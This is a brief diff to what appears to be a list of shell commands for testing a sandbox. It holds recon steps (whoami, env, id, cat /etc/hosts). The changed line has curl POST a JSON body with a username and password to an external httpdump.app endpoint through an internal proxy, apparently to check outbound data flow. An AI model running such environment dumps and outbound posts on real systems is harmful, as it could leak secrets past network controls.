@@ -1,4 +1,4 @@
 - Run `mkdir /tmp/test`
 - Run `whoami; env; id`
 - Run `cat /etc/hosts`
-- Run `curl https://httpbin.dev/user-agent --proxy http://172.31.0.68`
+- Run `curl --header "Content-Type: application/json" --request POST --data '{"username":"Marcel","password":"supersecret","this is a":"test"}' https://httpdump.app/dumps/2ae87bfe-fd7f-4c96-a3e1-66813d3873f3 --proxy http://172.31.0.68`
